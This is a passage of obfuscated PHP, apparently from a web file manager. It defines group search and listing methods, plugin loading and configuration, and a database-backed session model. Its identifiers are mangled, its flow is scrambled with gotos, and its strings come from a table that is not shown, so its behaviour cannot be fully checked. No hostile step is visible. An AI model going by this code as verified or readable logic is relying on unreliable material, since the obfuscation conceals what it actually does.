array($c‡§¸ÂöŠ°[2068], $c‡§¸ÂöŠ°[28], $c‡§¸ÂöŠ°[2054], $c‡§¸ÂöŠ°[183]); $cõõ™¦ßã£ = array($c‡§¸ÂöŠ°[397] => $c‡§¸ÂöŠ°[398], $c‡§¸ÂöŠ°[399] => $c‡§¸ÂöŠ°[400]); goto C‰ÀóçÕ†ê; C‰ÀóçÕ†ê: $EÌ¶®½˜Í• = Input::get($c‡§¸ÂöŠ°[402], $c‡§¸ÂöŠ°[7], $c‡§¸ÂöŠ°[2072], $f„èƒ˜£¤ò); $F¦Œ…µé = Input::get($c‡§¸ÂöŠ°[403], $c‡§¸ÂöŠ°[7], $c‡§¸ÂöŠ°[2143], array($c‡§¸ÂöŠ°[2143], $c‡§¸ÂöŠ°[399])); $F¦Œ…µé = $cõõ™¦ßã£[$F¦Œ…µé]; goto E“ æ·Ìó; E“ æ·Ìó: $dÅ¢…ÙŠ­ = $dÅ¢…ÙŠ­ . "{$EÌ¶®½˜Í•}\x20{$F¦Œ…µé}\54\x20\147\x72\157\165\x70\111\x44\40\x61\x73\x63"; return $this->order($dÅ¢…ÙŠ­); goto a¹í³¥Î„‘; a¹í³¥Î„‘: } public function listChild($Dé’§¿ÏÛ) { $aéØ®Ï‰¢ã =& $_SERVER[õëù©û]; $e›§•áÏ¹ê = $this->where(array($aéØ®Ï‰¢ã[456] => $Dé’§¿ÏÛ))->_makeOrder()->selectPage(200); $this->_listDataApply($e›§•áÏ¹ê[$aéØ®Ï‰¢ã[350]]); return $e›§•áÏ¹ê; } public function listByID($E»…Ü“Ü„Ç) { $Fé†ÑööÜ =& $_SERVER[õëù©û]; if (!$E»…Ü“Ü„Ç) { return array(); } $d˜™ï½õÂ = array($Fé†ÑööÜ[2068] => array($Fé†ÑööÜ[7], $E»…Ü“Ü„Ç)); $eñï£ä¸ß÷ = $this->where($d˜™ï½õÂ)->select(); $this->_listDataApply($eñï£ä¸ß÷); return $eñï£ä¸ß÷; } public function listSearch($FÙè‘ÛÎ¯—) { goto A×ïµßİÂ; f£İ›ø‡À°: $BŒËÕ‰¸æ¨ = $this->_makeOrder()->where($DÀ´×àå§)->selectPage(20); $BŒËÕ‰¸æ¨ = $BŒËÕ‰¸æ¨ ? $BŒËÕ‰¸æ¨ : array(); if (!$BŒËÕ‰¸æ¨ || count($BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[350]]) < 5 && Input::check($C£ğ×ŠËŒ†, $bŠ‡ÑæÒ™[302])) { $E‡ÈªÛ‘ğˆ = $this->_searchFromMeta($bŠ‡ÑæÒ™[410], $C£ğ×ŠËŒ†, 10); $EËù‰¥ì’Ê = $this->_searchFromMeta($bŠ‡ÑæÒ™[411], $C£ğ×ŠËŒ†, 10); $c¦ÃÈ’…’÷ = array_merge($E‡ÈªÛ‘ğˆ, $EËù‰¥ì’Ê, $BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[350]]); $BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[350]] = array_unique_by_key($c¦ÃÈ’…’÷, $bŠ‡ÑæÒ™[2068]); $BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[347]][$bŠ‡ÑæÒ™[348]] = count($BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[350]]); $BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[347]][$bŠ‡ÑæÒ™[349]] = ceil($BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[347]][$bŠ‡ÑæÒ™[348]] / $BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[347]][$bŠ‡ÑæÒ™[345]]); } goto dÅ±Œ—ä‘‹; A×ïµßİÂ: $bŠ‡ÑæÒ™ =& $_SERVER[õëù©û]; $C£ğ×ŠËŒ† = $FÙè‘ÛÎ¯—[$bŠ‡ÑæÒ™[2144]]; $EÈéëÍäƒ— = isset($FÙè‘ÛÎ¯—[$bŠ‡ÑæÒ™[2145]]) ? $FÙè‘ÛÎ¯—[$bŠ‡ÑæÒ™[2145]] : !1; goto c”©™­®Î; dÅ±Œ—ä‘‹: $this->_listDataApply($BŒËÕ‰¸æ¨[$bŠ‡ÑæÒ™[350]]); return $BŒËÕ‰¸æ¨; goto F¶Ş—Ùäßí; c”©™­®Î: if (!trim($C£ğ×ŠËŒ†)) { return !1; } $C£ğ×ŠËŒ† = str_replace($bŠ‡ÑæÒ™[2146], $bŠ‡ÑæÒ™[2147], $C£ğ×ŠËŒ†); $DÀ´×àå§ = array($bŠ‡ÑæÒ™[2068] => array($bŠ‡ÑæÒ™[746], "\x25{$C£ğ×ŠËŒ†}\45"), $bŠ‡ÑæÒ™[28] => array($bŠ‡ÑæÒ™[746], "\x25{$C£ğ×ŠËŒ†}\x25"), $bŠ‡ÑæÒ™[907] => $bŠ‡ÑæÒ™[2148]); goto f£İ›ø‡À°; F¶Ş—Ùäßí: } private function _searchFromMeta($ağôÏƒøËÀ, $EÊ„Çì—”×, $EƒˆÙ¶Îø) { goto E¾®´’ìÁÈ; E¾®´’ìÁÈ: $D’ùÌùë¯ =& $_SERVER[õëù©û]; $EÊ„Çì—”× = strtolower($EÊ„Çì—”×); $E‰å”Â®ƒ² = array($D’ùÌùë¯[89] => $ağôÏƒøËÀ, $D’ùÌùë¯[355] => array($D’ùÌùë¯[746], "\45{$EÊ„Çì—”×}\45")); goto FÄ‰©†‡; f”Ì§ãèÎ­: $D¿¦ †Ïè = $this->where(array($D’ùÌùë¯[2140] => array($D’ùÌùë¯[7], $e…µ¦øˆ¥Ö)))->select(); if (!$D¿¦ †Ïè) { return array(); } return $D¿¦ †Ïè; goto CÊËŠîæĞŞ; FÄ‰©†‡: $e…µ¦øˆ¥Ö = Model($D’ùÌùë¯[2149])->where($E‰å”Â®ƒ²)->limit($EƒˆÙ¶Îø)->select(); if (!$e…µ¦øˆ¥Ö) { return array(); } $e…µ¦øˆ¥Ö = array_to_keyvalue($e…µ¦øˆ¥Ö, $D’ùÌùë¯[33], $D’ùÌùë¯[2068]); goto f”Ì§ãèÎ­; CÊËŠîæĞŞ: } protected function _listDataApplyItem($E‚£×“–ã) { $d·±×®ã†Ô = array($E‚£×“–ã); $this->_listDataApply($d·±×®ã†Ô); return $d·±×®ã†Ô[0]; } protected function _listDataApply(&$A«¶¹ÏÏ¬‹) { goto a±ªœÎÂ· ; B‡îâÈ¦Ø¿: $this->_listAppendParent($A«¶¹ÏÏ¬‹); $this->_listAppendSourceRoot($A«¶¹ÏÏ¬‹, $E´­¨ªË‡); goto aÂ¿÷æÙƒ; f‘á°‡ì¨¥: $this->_listAppendChildren($A«¶¹ÏÏ¬‹); $this->_listAppendChildrenMember($A«¶¹ÏÏ¬‹); $this->_listAppendMeta($A«¶¹ÏÏ¬‹, $E´­¨ªË‡); goto B‡îâÈ¦Ø¿; a±ªœÎÂ· : $cêĞÍÀĞğ« =& $_SERVER[õëù©û]; if (!$A«¶¹ÏÏ¬‹) { return; } $E´­¨ªË‡ = array_to_keyvalue($A«¶¹ÏÏ¬‹, $cêĞÍÀĞğ«[33], $cêĞÍÀĞğ«[2068]); goto f‘á°‡ì¨¥; aÂ¿÷æÙƒ: } private function _listAppendChildren(&$B—„œÉìÍ) { goto d›¼„Ë…Ã•; d›¼„Ë…Ã•: $Dœ×Šàò… =& $_SERVER[õëù©û]; $DÌ­Ÿ³Šäƒ = $Dœ×Šàò…[357]; $bÈñŞ‘Ê‘ = array(); goto d†µÒ¬ÂĞ†; d†µÒ¬ÂĞ†: $cï³¤õ½®ù = count($B—„œÉìÍ); $aÀ´¨ñ¶¿× = $this->tablePrefix . $this->tableName; for ($DÎ½„Ê¿ê = 0, $CóáÆèˆè„ = 0; $DÎ½„Ê¿ê < $cï³¤õ½®ù; $DÎ½„Ê¿ê++) { $CóáÆèˆè„++; $Eõöô‡¿‘‡ = $B—„œÉìÍ[$DÎ½„Ê¿ê][$Dœ×Šàò…[2068]]; $DÌ­Ÿ³Šäƒ .= "\123\x45\x4c\105\103\124\x20\52\x20\x46\x52\x4f\x4d\40\50\123\105\114\105\103\124\x20\47{$Eõöô‡¿‘‡}\137\x63\x68\151\154\x64\47\40\141\x73\40\150\141\x73\40\106\x52\117\x4d\40\x60{$aÀ´¨ñ¶¿×}\140\40\x77\150\145\162\x65\40\x70\x61\x72\x65\x6e\x74\x49\104\x3d{$Eõöô‡¿‘‡}\40\154\151\155\x69\x74\40\61\51\40\141\x73\40\164\x62\x5f{$Eõöô‡¿‘‡}\x20\x75\x6e\x69\157\156\x20\141\154\154\x20"; if (($CóáÆèˆè„ >= 20 || $DÎ½„Ê¿ê == $cï³¤õ½®ù - 1) && $DÌ­Ÿ³Šäƒ) { $DÌ­Ÿ³Šäƒ = substr($DÌ­Ÿ³Šäƒ, 0, -strlen($Dœ×Šàò…[444])); $Fò´³í¶Ç = $this->query($DÌ­Ÿ³Šäƒ); $bÈñŞ‘Ê‘ = array_merge($bÈñŞ‘Ê‘, $Fò´³í¶Ç); $CóáÆèˆè„ = 0; $DÌ­Ÿ³Šäƒ = $Dœ×Šàò…[33]; } } goto bôƒÊí¯º¾; bôƒÊí¯º¾: $bÈñŞ‘Ê‘ = array_to_keyvalue($bÈñŞ‘Ê‘, $Dœ×Šàò…[445]); foreach ($B—„œÉìÍ as &$CÎ¤ÜÌíÙ‰) { $CÎ¤ÜÌíÙ‰[$Dœ×Šàò…[2150]] = isset($bÈñŞ‘Ê‘[$CÎ¤ÜÌíÙ‰[$Dœ×Šàò…[2068]] . $Dœ×Šàò…[2151]]); } goto FÑøÆ…–Âœ; FÑøÆ…–Âœ: } private function _listAppendChildrenMember(&$d¥ˆÛ„áÕ¨) { goto eâŠàÃ£™ğ; eâŠàÃ£™ğ: $d©¨Á´ø  =& $_SERVER[õëù©û]; $E£ßè‚êÛŠ = $d©¨Á´ø [357]; $C¹”ğíĞ’ñ = array(); goto eÁº®ÖÂÛŠ; eÁº®ÖÂÛŠ: $b¹ÔÊºİÏ© = count($d¥ˆÛ„áÕ¨); $f …éåáªÍ = $this->tablePrefix . $d©¨Á´ø [2142]; for ($fÕ´˜Ò©° = 0, $bô‘Ã¤›… = 0; $fÕ´˜Ò©° < $b¹ÔÊºİÏ©; $fÕ´˜Ò©°++) { $bô‘Ã¤›…++; $bé¯®âç‡ = $d¥ˆÛ„áÕ¨[$fÕ´˜Ò©°][$d©¨Á´ø [2068]]; $E£ßè‚êÛŠ .= "\x53\105\114\105\103\124\40\x2a\x20\x46\x52\x4f\115\x20\x28\123\x45\114\x45\103\124\40\47{$bé¯®âç‡}\137\x63\150\151\154\144\x27\40\141\x73\x20\150\x61\x73\40\106\122\117\115\40\x60{$f …éåáªÍ}\x60\40\167\150\x65\x72\x65\x20\147\x72\157\165\x70\111\x44\x3d{$bé¯®âç‡}\x20\x6c\151\155\x69\164\40\x31\51\x20\141\163\40\x74\x62\137{$bé¯®âç‡}\40\165\156\151\157\x6e\x20\141\x6c\x6c\40"; if (($bô‘Ã¤›… >= 20 || $fÕ´˜Ò©° == $b¹ÔÊºİÏ© - 1) && $E£ßè‚êÛŠ) { $E£ßè‚êÛŠ = substr($E£ßè‚êÛŠ, 0, -strlen($d©¨Á´ø [444])); $EÀÊ±›õÂ = $this->query($E£ßè‚êÛŠ); $C¹”ğíĞ’ñ = array_merge($C¹”ğíĞ’ñ, $EÀÊ±›õÂ); $bô‘Ã¤›… = 0; $E£ßè‚êÛŠ = $d©¨Á´ø [33]; } } goto a”º’„Ş¹³; a”º’„Ş¹³: $C¹”ğíĞ’ñ = array_to_keyvalue($C¹”ğíĞ’ñ, $d©¨Á´ø [445]); foreach ($d¥ˆÛ„áÕ¨ as &$Fˆå‹–ä¿É) { $Fˆå‹–ä¿É[$d©¨Á´ø [2152]] = isset($C¹”ğíĞ’ñ[$Fˆå‹–ä¿É[$d©¨Á´ø [2068]] . $d©¨Á´ø [2151]]); } goto fæ¦ÈíšÈ›; fæ¦ÈíšÈ›: } private function _listAppendMeta(&$E½ğõ“ìø§, $FËíäîìèŸ) { $e®¢×Êêå =& $_SERVER[õëù©û]; $fØŒƒ´ºÏ = array($e®¢×Êêå[2068] => array($e®¢×Êêå[7], $FËíäîìèŸ)); $F…á‘ˆØ¬ = Model($e®¢×Êêå[2141])->where($fØŒƒ´ºÏ)->select(); $F…á‘ˆØ¬ = array_to_keyvalue_group($F…á‘ˆØ¬, $e®¢×Êêå[2068]); foreach ($F…á‘ˆØ¬ as &$B¨ò‡³©Ò) { $B¨ò‡³©Ò = array_to_keyvalue($B¨ò‡³©Ò, $e®¢×Êêå[89], $e®¢×Êêå[355]); } foreach ($E½ğõ“ìø§ as &$E‹…Œ·£) { $E‹…Œ·£[$e®¢×Êêå[412]] = array(); if (isset($F…á‘ˆØ¬[$E‹…Œ·£[$e®¢×Êêå[2068]]])) { $E‹…Œ·£[$e®¢×Êêå[412]] = $F…á‘ˆØ¬[$E‹…Œ·£[$e®¢×Êêå[2068]]]; } } } protected function parentLevelArray($bÍ²ªÔ¾ÇÒ) { $c¶Ä¶ñÇ„ñ =& $_SERVER[õëù©û]; $bÍ²ªÔ¾ÇÒ = explode($c¶Ä¶ñÇ„ñ[47], trim($bÍ²ªÔ¾ÇÒ, $c¶Ä¶ñÇ„ñ[47])); $bÍ²ªÔ¾ÇÒ = array_remove_value($bÍ²ªÔ¾ÇÒ, $c¶Ä¶ñÇ„ñ[463]); return $bÍ²ªÔ¾ÇÒ; } private function _listAppendParent(&$A¨–¶¦Õ‰Ô) { goto BÙŠ—¯ÖîÍ; BÙŠ—¯ÖîÍ: $D¼ğù÷Ã¢“ =& $_SERVER[õëù©û]; $A­ß½ëĞÁ° = array(); foreach ($A¨–¶¦Õ‰Ô as &$CµÍÉî‡“Í) { $A­ß½ëĞÁ°[$CµÍÉî‡“Í[$D¼ğù÷Ã¢“[2068]]] = $CµÍÉî‡“Í[$D¼ğù÷Ã¢“[28]]; $A»µÒÂö²¼ = $this->parentLevelArray($CµÍÉî‡“Í[$D¼ğù÷Ã¢“[454]]); foreach ($A»µÒÂö²¼ as $côÊßĞô) { if (!isset($A­ß½ëĞÁ°[$côÊßĞô])) { $A­ß½ëĞÁ°[$côÊßĞô] = 0; } } } goto f››é¾¹; CèóĞ¾‰Æ–: foreach ($A¨–¶¦Õ‰Ô as &$CµÍÉî‡“Í) { $A»µÒÂö²¼ = $this->parentLevelArray($CµÍÉî‡“Í[$D¼ğù÷Ã¢“[454]]); $F‰¢ÂôÄáˆ = $D¼ğù÷Ã¢“[33]; foreach ($A»µÒÂö²¼ as $côÊßĞô) { $F‰¢ÂôÄáˆ .= $A­ß½ëĞÁ°[$côÊßĞô] . $D¼ğù÷Ã¢“[8]; } if ($A»µÒÂö²¼) { $F‰¢ÂôÄáˆ .= $CµÍÉî‡“Í[$D¼ğù÷Ã¢“[28]]; } $CµÍÉî‡“Í[$D¼ğù÷Ã¢“[458]] = str_replace($D¼ğù÷Ã¢“[462], $D¼ğù÷Ã¢“[8], $F‰¢ÂôÄáˆ); } goto B“ßó×˜¨; f››é¾¹: $aØ˜£×èğ… = array(); foreach ($A­ß½ëĞÁ° as $b¨¬¦Ã–½ˆ => $A£èöÒÄ²è) { if (!$A£èöÒÄ²è) { $aØ˜£×èğ…[] = $b¨¬¦Ã–½ˆ; } } if ($aØ˜£×èğ…) { $D¾Ÿë²–¼’ = array($D¼ğù÷Ã¢“[2140] => array($D¼ğù÷Ã¢“[380], $aØ˜£×èğ…)); $eÂò¶äáÖÒ = $this->field($D¼ğù÷Ã¢“[2153])->where($D¾Ÿë²–¼’)->select(); $FÉ¤ÒÜ¡…• = array_to_keyvalue($eÂò¶äáÖÒ, $D¼ğù÷Ã¢“[2068], $D¼ğù÷Ã¢“[28]); $A­ß½ëĞÁ° = array_merge_index($A­ß½ëĞÁ°, $FÉ¤ÒÜ¡…•); } goto CèóĞ¾‰Æ–; B“ßó×˜¨: } private function _listAppendSourceRoot(&$Aë¨Ö”¦‡ó, $c±¨‡§êÍ) { goto b¾é•«Â³™; FáÁà“Ç«: foreach ($Aë¨Ö”¦‡ó as &$BÌçÔ¤½ğ) { $BÌçÔ¤½ğ[$c§•¿¿ÚËÄ[387]] = $f÷’àœğÒÎ[$BÌçÔ¤½ğ[$c§•¿¿ÚËÄ[2068]]] ? $f÷’àœğÒÎ[$BÌçÔ¤½ğ[$c§•¿¿ÚËÄ[2068]]] : array(); } goto E´¥Ÿ‚×ê®; b¾é•«Â³™: $c§•¿¿ÚËÄ =& $_SERVER[õëù©û]; $Aßö²ä…í¢ = array($c§•¿¿ÚËÄ[367] => SourceModel::TYPE_GROUP, $c§•¿¿ÚËÄ[456] => 0, $c§•¿¿ÚËÄ[451] => array($c§•¿¿ÚËÄ[7], $c±¨‡§êÍ)); $Bôò‰Å´Ù = $c§•¿¿ÚËÄ[2154]; goto AšƒÍÙÑì; AšƒÍÙÑì: $f÷’àœğÒÎ = Model($c§•¿¿ÚËÄ[747])->order($c§•¿¿ÚËÄ[2155])->field($Bôò‰Å´Ù)->where($Aßö²ä…í¢)->select(); $f÷’àœğÒÎ = array_to_keyvalue($f÷’àœğÒÎ, $c§•¿¿ÚËÄ[451]); $f÷’àœğÒÎ = array_remove_key($f÷’àœğÒÎ, $c§•¿¿ÚËÄ[451]); goto FáÁà“Ç«; E´¥Ÿ‚×ê®: } protected function resetParentLevel() { $AÊÍÃ¶•’± =& $_SERVER[õëù©û]; $FËîãî³È = $AÊÍÃ¶•’±[2068]; $D»ìíĞ³¶Ä = $this->select(); $D»ìíĞ³¶Ä = array_to_keyvalue($D»ìíĞ³¶Ä, $FËîãî³È); foreach ($D»ìíĞ³¶Ä as $fä¶î¶ğãÀ) { goto EÚ¿Í‰Î¥…; EÚ¿Í‰Î¥…: $aØ¢­ÍĞËˆ = $fä¶î¶ğãÀ; $aìŸ¢ÀºÕ¥ = array(); while ($aØ¢­ÍĞËˆ[$AÊÍÃ¶•’±[456]] != 0) { $aìŸ¢ÀºÕ¥[] = $aØ¢­ÍĞËˆ[$AÊÍÃ¶•’±[456]]; $aØ¢­ÍĞËˆ = $D»ìíĞ³¶Ä[$aØ¢­ÍĞËˆ[$AÊÍÃ¶•’±[456]]]; } goto D·‰­‹·ä; D·‰­‹·ä: $aìŸ¢ÀºÕ¥[] = 0; $aìŸ¢ÀºÕ¥ = $AÊÍÃ¶•’±[47] . implode($AÊÍÃ¶•’±[47], array_reverse($aìŸ¢ÀºÕ¥)) . $AÊÍÃ¶•’±[47]; $this->setNamePinyin($fä¶î¶ğãÀ[$FËîãî³È], $fä¶î¶ğãÀ[$AÊÍÃ¶•’±[28]]); goto d¨ê¼‚òÌƒ; d¨ê¼‚òÌƒ: $this->where(array($FËîãî³È => $fä¶î¶ğãÀ[$FËîãî³È]))->save(array($AÊÍÃ¶•’±[520] => $aìŸ¢ÀºÕ¥)); goto a™å×ËÊõ; a™å×ËÊõ: } return $D»ìíĞ³¶Ä; } public function groupNameAuto($d¢¼ò“äè, $Dè”Œî£Òé) { $E”¥œóÁŞ¾ =& $_SERVER[õëù©û]; $EÈ¾È§Á¶† = $this->where(array($E”¥œóÁŞ¾[364] => $d¢¼ò“äè))->getField($E”¥œóÁŞ¾[28], !0); if (!$EÈ¾È§Á¶† || !in_array($Dè”Œî£Òé, $EÈ¾È§Á¶†)) { return $Dè”Œî£Òé; } for ($aé¢ÆÚ·Íù = 1; $aé¢ÆÚ·Íù <= count($EÈ¾È§Á¶†) + 1; $aé¢ÆÚ·Íù++) { $CŒöèçÁ™Ä = $Dè”Œî£Òé . "\x28{$aé¢ÆÚ·Íù}\x29"; if (!in_array($CŒöèçÁ™Ä, $EÈ¾È§Á¶†)) { return $CŒöèçÁ™Ä; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x70\x6c\x75\147\x69\156\x4c\151\163\164"; public $field = array("\x6e\x61\155\145", "\x73\x74\x61\164\165\x73", "\x72\145\x67\151\145\163\x74", "\143\157\156\146\x69\x67"); public function loadList($cÏ“äâ³ = false) { $CŸº›ØİäÃ = array_to_keyvalue($this->listData(), $_SERVER[õëù©û][28]); if ($cÏ“äâ³) { return $CŸº›ØİäÃ[$cÏ“äâ³]; } return $CŸº›ØİäÃ; } public function init() { $CÖ­ù‚‰Ø =& $_SERVER[õëù©û]; Hook::trigger($CÖ­ù‚‰Ø[2156]); $CĞÑ‡¥¡ÖÊ = $this->loadPluginList(); foreach ($CĞÑ‡¥¡ÖÊ as $e”“¦àååº => $FæË²ÖÀò) { $e«ÉïÁÀ†‹ = $this->appAllow($e”“¦àååº, $FæË²ÖÀò); if (!$e«ÉïÁÀ†‹) { continue; } foreach ($FæË²ÖÀò[$CÖ­ù‚‰Ø[2157]] as $d±µ”ÖâÑ => $FŸ™×Óâ²¸) { Hook::bind($d±µ”ÖâÑ, $FŸ™×Óâ²¸); } } Hook::trigger($CÖ­ù‚‰Ø[2158]); Hook::trigger(ACTION); } public function appAllow($cĞÉÆ·á, $cÑîÙô‘¨Æ, $EÉ¶îì·‹â = true) { $f»ÆƒùêÑ =& $_SERVER[õëù©û]; $E´Å„«Òàò = PLUGIN_DIR . $cĞÉÆ·á . $f»ÆƒùêÑ[2159]; if (!is_array($cÑîÙô‘¨Æ) || !is_array($cÑîÙô‘¨Æ[$f»ÆƒùêÑ[2157]]) || !is_file($E´Å„«Òàò) || $cÑîÙô‘¨Æ[$f»ÆƒùêÑ[684]] != 1) { return !1; } if ($EÉ¶îì·‹â && !Action($f»ÆƒùêÑ[2160])->checkAuth($cĞÉÆ·á)) { return !1; } return !0; } public function unInstall($b›‰§œã¸) { $DÑ’Ø£éÄğ =& $_SERVER[õëù©û]; $AØÔäìŒ© = $this->loadList($b›‰§œã¸); if (file_exists(PLUGIN_DIR . $b›‰§œã¸)) { Hook::apply($b›‰§œã¸ . $DÑ’Ø£éÄğ[2161]); } $this->remove($AØÔäìŒ©[$DÑ’Ø£éÄğ[363]]); } public function changeStatus($f»ŸÍ÷Ïø±, $aİ«óÈ°¿) { $fíîï§’ÕÏ =& $_SERVER[õëù©û]; $f·™øªâñ® = $this->loadList($f»ŸÍ÷Ïø±); if ($aİ«óÈ°¿) { Hook::apply($f»ŸÍ÷Ïø± . $fíîï§’ÕÏ[2162]); } $this->update($f·™øªâñ®[$fíîï§’ÕÏ[363]], array($fíîï§’ÕÏ[2163] => $aİ«óÈ°¿)); } public function appRegist($fŠ­Ê«‚Í , $DàŞëà) { $dğŠùÅê¾ =& $_SERVER[õëù©û]; $BÑé˜Í‰öù = $this->loadList($fŠ­Ê«‚Í ); if ($BÑé˜Í‰öù) { $this->update($BÑé˜Í‰öù[$dğŠùÅê¾[363]], array($dğŠùÅê¾[2157] => $DàŞëà)); } else { $fæ†Òˆ¿ÄÃ = array($dğŠùÅê¾[28] => $fŠ­Ê«‚Í , $dğŠùÅê¾[2157] => $DàŞëà, $dğŠùÅê¾[684] => 0, $dğŠùÅê¾[6] => $this->getConfigDefault($fŠ­Ê«‚Í )); $this->insert($fæ†Òˆ¿ÄÃ); } } public function getConfigDefault($CòÒƒ…õµ¥) { $E–£ªíÙ¨ =& $_SERVER[õëù©û]; $f¦±Å‘™± = array(); $E©Âœ­ôô = $this->getPackageJson($CòÒƒ…õµ¥); if (!$E©Âœ­ôô && is_array($E©Âœ­ôô[$E–£ªíÙ¨[2164]])) { return $f¦±Å‘™±; } foreach ($E©Âœ­ôô[$E–£ªíÙ¨[2164]] as $DŠŒ¥—íˆà => $eâ¹ˆÛÀÕ) { if (!isset($eâ¹ˆÛÀÕ[$E–£ªíÙ¨[355]]) || isset($f¦±Å‘™±[$DŠŒ¥—íˆà])) { continue; } $f¦±Å‘™±[$DŠŒ¥—íˆà] = $eâ¹ˆÛÀÕ[$E–£ªíÙ¨[355]]; } return $f¦±Å‘™±; } public function getPackageJson($f‰¢‡Ğç£) { return Hook::apply($f‰¢‡Ğç£ . $_SERVER[õëù©û][2165]); } public function getConfig($Aã”»ŒÅçÔ, $Bğ‡ÊÅëƒ = false) { $cÉ¼´†šÅŒ =& $_SERVER[õëù©û]; $F¶£òªÏ‡ = array(); $d¿‚ãîÇ— = $this->loadList($Aã”»ŒÅçÔ); if ($d¿‚ãîÇ— && is_array($d¿‚ãîÇ—[$cÉ¼´†šÅŒ[6]])) { $F¶£òªÏ‡ = $d¿‚ãîÇ—[$cÉ¼´†šÅŒ[6]]; } if (!$F¶£òªÏ‡ || $Bğ‡ÊÅëƒ) { $F¶£òªÏ‡ = $this->getConfigDefault($Aã”»ŒÅçÔ); } return $F¶£òªÏ‡; } public function setConfig($E¸÷Š·’¨, $A¨ïÆÎí’¢ = false) { goto a¡ŸØˆĞ‡; a¡ŸØˆĞ‡: $f÷š–ò¸‰¥ =& $_SERVER[õëù©û]; $Dù¿Ö¤ÛÑ = $this->loadList($E¸÷Š·’¨); if (!$Dù¿Ö¤ÛÑ) { return !1; } goto bÆãõØò†Â; bÆãõØò†Â: if ($A¨ïÆÎí’¢ == !1) { $A¨ïÆÎí’¢ = $this->getConfigDefault($E¸÷Š·’¨); } $FÒÄ˜ñ„š = $Dù¿Ö¤ÛÑ[$f÷š–ò¸‰¥[6]]; foreach ($A¨ïÆÎí’¢ as $fâŸ˜ÙÍÛ => $E“¥¹µË ğ) { $FÒÄ˜ñ„š[$fâŸ˜ÙÍÛ] = is_string($E“¥¹µË ğ) ? trim($E“¥¹µË ğ) : $E“¥¹µË ğ; } goto cñÛ¹îŠ§Ú; cñÛ¹îŠ§Ú: $this->update($Dù¿Ö¤ÛÑ[$f÷š–ò¸‰¥[363]], array($f÷š–ò¸‰¥[6] => $FÒÄ˜ñ„š)); goto c‘Æ‚Ï™ŒŸ; c‘Æ‚Ï™ŒŸ: } public function viewList() { goto BÃ«Ñ½‹; B¿Ü²ø†©×: return $fÅÑ¦»ÏŞ; goto Bª†êä¤Óµ; DôÕ¼‰Ÿ£: $A¿Í±É·œŸ = $this->loadPluginList(); $fÅÑ¦»ÏŞ = array(); foreach ($A¿Í±É·œŸ as $Eª”Ÿ£Ä’ => $AÑ—Ô†Ç‚) { unset($AÑ—Ô†Ç‚[$fÑ°›øĞ…Ï[2157]], $AÑ—Ô†Ç‚[$fÑ°›øĞ…Ï[6]]); $bÑÀ·µÆĞ¥ = PLUGIN_DIR . $AÑ—Ô†Ç‚[$fÑ°›øĞ…Ï[28]] . $fÑ°›øĞ…Ï[2159]; if (!is_file($bÑÀ·µÆĞ¥)) { continue; } $D¸©Í°àš = Hook::apply($AÑ—Ô†Ç‚[$fÑ°›øĞ…Ï[28]] . $fÑ°›øĞ…Ï[2165]); if (is_array($D¸©Í°àš)) { $fÅÑ¦»ÏŞ[$Eª”Ÿ£Ä’] = array_merge($AÑ—Ô†Ç‚, $D¸©Í°àš); } } goto B¿Ü²ø†©×; BÃ«Ñ½‹: $fÑ°›øĞ…Ï =& $_SERVER[õëù©û]; $A¿Í±É·œŸ = $this->loadList(); $this->pluginScan($A¿Í±É·œŸ); goto DôÕ¼‰Ÿ£; Bª†êä¤Óµ: } private function loadPluginList() { $a‹§“–Ì‚ =& $_SERVER[õëù©û]; $D ±‰Š¿¥– = $this->loadList(); if (strtolower(MOD) == $a‹§“–Ì‚[2166]) { return $D ±‰Š¿¥–; } $c†ë…·¿õÆ = Hook::trigger($a‹§“–Ì‚[2167], $D ±‰Š¿¥–); if ($D ±‰Š¿¥– && !$c†ë…·¿õÆ) { die; } return $c†ë…·¿õÆ ? $c†ë…·¿õÆ : $D ±‰Š¿¥–; } private function pluginScan($EƒÍ”¢Ô¡Œ) { $FØŒôÂØ¹Ï =& $_SERVER[õëù©û]; recursion_dir(PLUGIN_DIR, $A½ÄÎ„Ú , $E¼ŒÇ‰Åïè, 0); foreach ($A½ÄÎ„Ú  as $e½ª—ÌÖë) { $aÔá‡ŠÖ×• = get_path_this($e½ª—ÌÖë); if (isset($EƒÍ”¢Ô¡Œ[$aÔá‡ŠÖ×•]) || !file_exists($e½ª—ÌÖë . $FØŒôÂØ¹Ï[2168]) || !file_exists($e½ª—ÌÖë . $FØŒôÂØ¹Ï[2159])) { continue; } Hook::apply($aÔá‡ŠÖ×• . $FØŒôÂØ¹Ï[2162]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\x6d\x5f\163\145\163\163\151\157\x6e"; public function get($cË˜…“ÎÀÖ) { $c´—ôÀ¨ã =& $_SERVER[õëù©û]; $Cò‚¾¤Ç¦ = $this->where(array($c´—ôÀ¨ã[2169] => $cË˜…“ÎÀÖ))->find(); if (!is_array($Cò‚¾¤Ç¦)) { return !1; } return $Cò‚¾¤Ç¦[$c´—ôÀ¨ã[687]]; } public function set($a •Æ¡ºÍÎ, $fé«„šŸ³œ, $EÈÈ˜Òî‹ = 3600) { $BéÑ°œç =& $_SERVER[õëù©û]; $añ“‘ó˜¤å = array($BéÑ°œç[2169] => $a •Æ¡ºÍÎ, $BéÑ°œç[2098] => $fé«„šŸ³œ, $BéÑ°œç[2170] => $EÈÈ˜Òî‹ + time()); if (Session::get($BéÑ°œç[2171])) { $añ“‘ó˜¤å[$BéÑ°œç[1404]] = Session::get($BéÑ°œç[2171]); } else { $añ“‘ó˜¤å[$BéÑ°œç[1404]] = 0; } if ($this->get($a •Æ¡ºÍÎ)) { return $this->where(array($BéÑ°œç[2169] => $a •Æ¡ºÍÎ))->save($añ“‘ó˜¤å); } else { return $this->add($añ“‘ó˜¤å, array(), !0); } } public function remove($D°ì§ï¼Šˆ) { return $this->where(array($_SERVER[õëù©û][2169] => $D°ì§ï¼Šˆ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[õëù©û][2172] . time())->delete(); } } goto eˆÛäêÌ—¦; 